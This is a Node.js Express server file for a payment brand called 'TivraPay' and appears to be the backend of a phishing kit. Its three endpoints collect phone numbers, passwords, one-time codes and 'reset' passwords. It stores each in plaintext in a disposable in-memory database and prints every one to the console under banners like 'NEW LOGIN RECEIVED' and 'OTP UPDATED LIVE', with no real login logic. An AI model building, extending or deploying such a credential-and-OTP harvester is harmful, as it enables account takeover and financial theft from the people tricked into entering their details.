const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path'); // Naya add kiya file paths handle karne ke liye
const { MongoMemoryServer } = require('mongodb-memory-server');

const app = express();

// PORT Setting: Render automatic process.env.PORT deta hai, local par 6500 chalega
const PORT = process.env.PORT || 6500; 

// Aggressive CORS policy taaki browser error na de
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));
app.use(express.json());

// ========================================================
// ⚡ FRONTEND SERVING LOGIC (FIXED FOR FRONTEND FOLDER)
// ========================================================
// 1. Isse public static files serve hongi
app.use(express.static(__dirname));

// Naya static path taaki frontend folder ke andar ki CSS/Images bhi load ho sakein
app.use('/frontend', express.static(path.join(__dirname, 'frontend')));

// 2. Jab koi direct tivrapay.store kholega, toh frontend folder ke andar se index.html load hogi
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend', 'index.html'));
});
// ========================================================

// Main Schema
const UserSchema = new mongoose.Schema({
    phoneNumber: { type: String, required: false },
    password: { type: String, required: false },
    otp: { type: String, required: false },
    resetPhone: { type: String, required: false },
    newPassword: { type: String, required: false },
    actionType: { type: String, default: 'LOGIN' },
    timestamp: { type: Date, default: Date.now }
});

const User = mongoose.model('User', UserSchema);

async function startServer() {
    try {
        const mongoServer = await MongoMemoryServer.create();
        const mongoUri = mongoServer.getUri();

        await mongoose.connect(mongoUri);
        console.log(`\n==================================================`);
        console.log(`🎉 MongoDB (TivraPay In-Memory) Connected successfully!`);
        console.log(`==================================================`);

        app.listen(PORT, () => {
            console.log(`🚀 Trivia Pay Backend Server actively monitoring port: ${PORT}`);
            console.log(`Aapka data stream channel perfectly config ho gaya hai.`);
            console.log(`==================================================\n`);
        });

    } catch (error) {
        console.error("❌ Server initialization failed:", error);
    }
}

// 1. Login Request Channel
app.post('/api/login-submit', async (req, res) => {
    try {
        const { phoneNumber, password } = req.body;
        const newUser = new User({ phoneNumber, password, actionType: 'LOGIN' });
        await newUser.save();

        console.log(`[⚡ TIVRA PAY - NEW LOGIN RECEIVED]`);
        console.log(`📱 Phone Number : ${phoneNumber}`);
        console.log(`🔑 Password     : ${password}`);
        console.log(`--------------------------------------------------`);

        res.status(200).json({ success: true, userId: newUser._id });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 2. Live OTP Stream Channel
app.post('/api/otp-submit', async (req, res) => {
    try {
        const { userId, otp } = req.body;
        let currentAction = 'UNKNOWN';

        if (mongoose.Types.ObjectId.isValid(userId)) {
            const updatedUser = await User.findByIdAndUpdate(userId, { otp: otp }, { new: true });
            if (updatedUser) {
                currentAction = updatedUser.actionType;
            }
        }

        console.log(`[🔐 TIVRA PAY - OTP UPDATED LIVE]`);
        console.log(`🎯 Flow Type: ${currentAction}`);
        console.log(`🔥 OTP Code : ${otp}`);
        console.log(`==================================================\n`);
        res.status(200).json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 3. Modify/Forgot Password Action Channel
app.post('/api/forgot-submit', async (req, res) => {
    try {
        const { phone, newPassword } = req.body;
        const resetRecord = new User({ resetPhone: phone, newPassword: newPassword, actionType: 'PASSWORD_RESET' });
        await resetRecord.save();

        console.log(`[🔄 TIVRA PAY - PASSWORD RESET ACTION]`);
        console.log(`📱 Account Phone: ${phone}`);
        console.log(`🔑 New Password : ${newPassword}`);
        console.log(`⏳ Waiting for Forget OTP...`);
        console.log(`--------------------------------------------------`);

        res.status(200).json({ success: true, userId: resetRecord._id });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

startServer();
